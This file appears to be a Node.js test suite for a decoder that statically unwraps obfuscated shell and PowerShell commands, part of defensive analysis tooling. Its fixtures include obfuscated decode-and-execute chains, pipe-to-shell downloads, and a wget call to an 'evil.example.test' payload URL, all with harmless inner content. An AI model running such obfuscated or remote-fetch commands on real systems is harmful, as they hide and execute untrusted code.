// Deterministic decoder (docs/ARCHITECTURE.md 8.2): pure, bounded, never executes anything.
import assert from 'node:assert/strict';
import { gzipSync } from 'node:zlib';
import { test } from 'node:test';
import { DECODER_LIMITS, decodeLayers, guessLanguage, layerPreview, scanMarkers, substituteLiterals } from '../unwrap/decoder.mjs';

const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
const INNER = 'echo hello from the inner layer of this test';

test('base64 pipe: one layer with span, markers on the input, clean leaf', () => {
  const cmd = `echo ${b64(INNER)} | base64 -d | bash`;
  const r = decodeLayers(cmd);
  assert.equal(r.layers.length, 1);
  const [l] = r.layers;
  assert.equal(l.index, 1);
  assert.equal(l.parent, 0);
  assert.equal(l.method, 'base64');
  assert.equal(l.text, INNER);
  assert.equal(l.bytes_len, Buffer.byteLength(INNER));
  assert.deepEqual(l.span, [5, 5 + b64(INNER).length]);
  assert.equal(l.llm_assisted, false);
  assert.equal(l.status, 'ok');
  assert.equal(l.truncated, false);
  assert.ok(r.inputMarkers.exec.includes('| bash'));
  assert.ok(r.inputMarkers.decode.includes('base64 -d'));
  assert.equal(r.needsHarness, false);
  assert.equal(r.stopped, 'clean');
  assert.equal(r.finalText, INNER);
  assert.equal(r.finalIndex, 1);
});

test('double base64 unwraps to a chain 0 -> 1 -> 2', () => {
  const middle = `echo ${b64(INNER)} | base64 -d | sh`;
  const cmd = `bash -c "$(echo ${b64(middle)} | base64 --decode)"`;
  const r = decodeLayers(cmd);
  assert.deepEqual(r.layers.map((l) => [l.index, l.parent, l.method]), [
    [1, 0, 'base64'],
    [2, 1, 'base64'],
  ]);
  assert.equal(r.layers[0].text, middle);
  assert.equal(r.finalText, INNER);
  assert.equal(r.stopped, 'clean');
});

test('gzip inside base64 becomes a gzip layer', () => {
  const cmd = `echo ${gzipSync(Buffer.from(INNER)).toString('base64')} | base64 -d | gunzip | bash`;
  const r = decodeLayers(cmd);
  assert.equal(r.layers.length, 1);
  assert.equal(r.layers[0].method, 'gzip');
  assert.equal(r.layers[0].text, INNER);
});

test('UTF-16LE base64 (PowerShell -EncodedCommand)', () => {
  const ps = 'Write-Host "hello from the encoded command"; Get-Date';
  const cmd = `powershell -NoProfile -enc ${Buffer.from(ps, 'utf16le').toString('base64')}`;
  const r = decodeLayers(cmd);
  assert.equal(r.layers.length, 1);
  assert.equal(r.layers[0].method, 'base64_utf16le');
  assert.equal(r.layers[0].text, ps);
  assert.ok(r.inputMarkers.exec.includes('-EncodedCommand'));
  assert.equal(guessLanguage(r.finalText), 'pwsh');
});

test('hex escapes and bare hex', () => {
  const esc = [...Buffer.from('echo hi')].map((b) => `\\x${b.toString(16).padStart(2, '0')}`).join('');
  let r = decodeLayers(`printf '${esc}' | sh`);
  assert.equal(r.layers[0]?.method, 'hex_escape');
  assert.equal(r.layers[0]?.text, 'echo hi');
  r = decodeLayers(`echo ${Buffer.from(INNER).toString('hex')} | xxd -r -p | bash`);
  assert.equal(r.layers[0]?.method, 'hex');
  assert.equal(r.layers[0]?.text, INNER);
});

test('percent-encoded runs', () => {
  const enc = [...Buffer.from('echo hi')].map((b) => `%${b.toString(16).toUpperCase().padStart(2, '0')}`).join('');
  const r = decodeLayers(`sh -c "$(printf '${enc}')"`);
  assert.equal(r.layers[0]?.method, 'url');
  assert.ok(r.layers[0].text.includes("printf 'echo hi'"));
});

test('shell variables and string concatenation are substituted', () => {
  const r = decodeLayers(`P1='echo hel'\nP2="lo there"\neval "$P1$P2"`);
  assert.equal(r.layers[0]?.method, 'vars');
  assert.ok(r.layers[0].text.includes('eval "echo hello there"'));
  assert.equal(r.stopped, 'clean');

  const ps = decodeLayers(`$s = 'Write-' + 'Host hi'; iex $s`);
  assert.deepEqual(ps.layers.map((l) => l.method), ['concat', 'vars']);
  assert.ok(ps.finalText.includes('iex Write-Host hi'), ps.finalText);

  const chars = substituteLiterals(`$x = ([char]72+[char]105); iex $x`);
  assert.ok(chars.text.includes("'Hi'"), chars.text);
  const join = substituteLiterals(`iex (('Wr','ite-Ho','st 1') -join '')`);
  assert.ok(join.text.includes("'Write-Host 1'"), join.text);
  assert.equal(substituteLiterals('echo plain'), null);
});

test('opaque tokens (hashes, binary) are counted, not opened', () => {
  const sha = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
  const r = decodeLayers(`curl -fsSL https://get.example.test/x.sh -o /tmp/x && echo "${sha}  /tmp/x" | sha256sum -c && bash /tmp/x`);
  assert.equal(r.layers.length, 0);
  assert.equal(r.inputMarkers.opaque, 1);
  assert.equal(r.stopped, 'remote');
});

test('needs_harness when the leaf still decodes and executes at runtime', () => {
  const r = decodeLayers(`eval "$(printf 'short' | xxd -r -p)"`);
  assert.equal(r.layers.length, 0);
  assert.equal(r.needsHarness, true);
  assert.equal(r.stopped, 'needs_harness');
  assert.equal(r.finalIndex, 0);
  assert.equal(r.languageGuess, 'bash');
  // A base64 token that decodes to text with a further runtime decode: harness on the leaf.
  const leaf = `X=$(echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d); eval "$X"`;
  const r2 = decodeLayers(`echo ${b64(leaf)} | base64 -d | bash -s -- SOMEARG`);
  assert.equal(r2.layers.length, 1);
  assert.equal(r2.needsHarness, true);
  assert.equal(r2.finalIndex, 1);
});

test('remote only: nothing to open on the host', () => {
  const r = decodeLayers('curl -fsSL https://get.example.test/install.sh | bash');
  assert.equal(r.layers.length, 0);
  assert.equal(r.stopped, 'remote');
  assert.equal(r.needsHarness, false);
  assert.deepEqual(r.inputMarkers.remote, ['curl']);
});

test('depth limit stops a 10-deep chain at 8 layers', () => {
  let t = 'echo deep';
  for (let i = 0; i < 10; i += 1) t = `echo ${b64(t)} | base64 -d | bash`;
  const r = decodeLayers(t);
  assert.equal(r.layers.length, DECODER_LIMITS.maxDepth);
  assert.equal(r.stopped, 'depth');
  assert.equal(r.layers.at(-1).parent, r.layers.at(-2).index);
});

test('children per layer and total layers are capped', () => {
  const tokens = Array.from({ length: 12 }, (_, i) => b64(`echo child number ${i} of the fan-out test`));
  const r = decodeLayers(tokens.map((t) => `echo ${t} | base64 -d | sh`).join('\n'));
  assert.equal(r.layers.length, DECODER_LIMITS.maxChildren);
  assert.ok(r.layers.every((l) => l.parent === 0));
});

test('time budget and cycle detection', () => {
  const cmd = `echo ${b64(INNER)} | base64 -d | bash`;
  const late = decodeLayers(cmd, { deadline: performance.now() - 1 });
  assert.equal(late.stopped, 'time');
  const seen = new Set();
  decodeLayers(cmd, { seen });
  const again = decodeLayers(cmd, { seen });
  assert.equal(again.layers.length, 0);
  assert.equal(again.stopped, 'cycle');
});

test('firstIndex / parent continue a numbering started elsewhere', () => {
  const r = decodeLayers(`echo ${b64(INNER)} | base64 -d | bash`, { firstIndex: 7, parent: 6 });
  assert.equal(r.layers[0].index, 7);
  assert.equal(r.layers[0].parent, 6);
});

test('pure and deterministic; pathological input finishes inside the budget', () => {
  const cmd = `echo ${b64(INNER)} | base64 -d | bash`;
  assert.deepEqual(decodeLayers(cmd), decodeLayers(cmd));
  const big = [
    'A'.repeat(16 * 1024),
    '%41'.repeat(5000),
    `${'ab1C'.repeat(4000)} ${'0f'.repeat(8000)}`,
    `X=${'$X'.repeat(8000)}`,
    "'a' + ".repeat(3000) + "'b'",
  ];
  for (const input of big) {
    const t0 = performance.now();
    const r = decodeLayers(input);
    assert.ok(performance.now() - t0 < 2500, `took too long on ${input.slice(0, 10)}`);
    assert.ok(['clean', 'time', 'size', 'depth'].includes(r.stopped), r.stopped);
  }
});

test('layer text is clipped to 64 KiB with status truncated', () => {
  const huge = `echo start\n${'# filler line for the big layer\n'.repeat(3000)}echo end`;
  const r = decodeLayers(`echo ${b64(huge)} | base64 -d | bash`);
  assert.equal(r.layers.length, 1);
  assert.equal(r.layers[0].status, 'truncated');
  assert.equal(r.layers[0].truncated, true);
  assert.ok(Buffer.byteLength(r.layers[0].text) <= DECODER_LIMITS.textMaxBytes);
  assert.equal(r.layers[0].bytes_len, Buffer.byteLength(huge));
});

test('layerPreview replaces text with a 4 KiB preview', () => {
  const layer = { index: 1, parent: 0, method: 'base64', text: 'x'.repeat(10_000), markers: scanMarkers('') };
  const p = layerPreview(layer);
  assert.equal(p.text, undefined);
  assert.equal(p.preview.length, 4096);
  assert.equal(p.index, 1);
});

test('chained decode pipeline with short tokens: base64 of base64 of a short command', () => {
  const inner = 'echo layered-ok';
  const once = b64(inner); // 20 chars: below the 40-char floor, opened because it is piped into a decoder
  const twice = b64(once); // 28 chars
  const r = decodeLayers(`echo '${twice}' | base64 -d | base64 -d | bash`);
  assert.deepEqual(r.layers.map((l) => [l.index, l.parent, l.method, l.text]), [
    [1, 0, 'base64', once],
    [2, 1, 'base64', inner],
  ]);
  assert.equal(r.stopped, 'clean');
  assert.equal(r.needsHarness, false);
  // Same thing through python and PowerShell decode functions.
  const py = decodeLayers(`python3 -c "import base64;exec(base64.b64decode('${once}'))"`);
  assert.equal(py.layers[0]?.text, inner);
  const ps = decodeLayers(`iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${once}')))`);
  assert.equal(ps.layers[0]?.text, inner);
  // A short token with no decoder next to it is left alone.
  assert.equal(decodeLayers(`echo ${once} is my token`).layers.length, 0);
});

test('vars layers only when substitution reveals something', () => {
  // Plain counters and messages: no layer.
  const noise = decodeLayers('n=0; for i in 1 2 3; do n=$((n+1)); sleep 0.1 & done; echo started $n');
  assert.equal(noise.layers.length, 0);
  assert.equal(decodeLayers('NAME=world\necho "hello $NAME"').layers.length, 0);
  // Variable as the command name.
  const cmd = decodeLayers('C=curl\n$C -fsSL https://get.example.test/x | sh');
  assert.equal(cmd.layers[0]?.method, 'vars');
  assert.ok(cmd.layers[0].text.includes('curl -fsSL'));
  // Variable inside a URL.
  const url = decodeLayers('H=evil.example.test\nwget -qO- "https://$H/payload" | sh');
  assert.equal(url.layers[0]?.method, 'vars');
  assert.ok(url.layers[0].text.includes('https://evil.example.test/payload'));
  // Substitution that reveals a decode marker.
  const marker = decodeLayers("D='base64 -d'\ncat /tmp/x | $D | sh");
  assert.equal(marker.layers[0]?.method, 'vars');
  assert.ok(marker.layers[0].markers.decode.includes('base64 -d'));
  // Substitution that reveals a decodable token.
  const tok = decodeLayers(`T=${b64(INNER)}\necho $T | base64 -d | bash`);
  assert.deepEqual(tok.layers.map((l) => l.method), ['vars', 'base64']);
  assert.equal(tok.finalText, INNER);
});

test('scanMarkers vocabulary and guessLanguage', () => {
  const m = scanMarkers(`python3 -c "import base64,subprocess; exec(base64.b64decode('x'))"`);
  assert.ok(m.exec.includes('exec(') && m.exec.includes('subprocess'));
  assert.ok(m.decode.includes('b64decode'));
  assert.deepEqual(m.remote, []);
  assert.equal(scanMarkers('ls -la && (cd /tmp)').exec.length, 0);
  assert.equal(scanMarkers('set -e\necho ok').exec.length, 0);
  assert.equal(guessLanguage('#!/usr/bin/env python3\nprint(1)'), 'python3');
  assert.equal(guessLanguage(`const c = require('child_process'); eval(Buffer.from('x','base64').toString())`), 'node');
  assert.equal(guessLanguage(`$x = [Convert]::FromBase64String('x'); iex $x`), 'pwsh');
  assert.equal(guessLanguage('echo hi | bash'), 'bash');
});
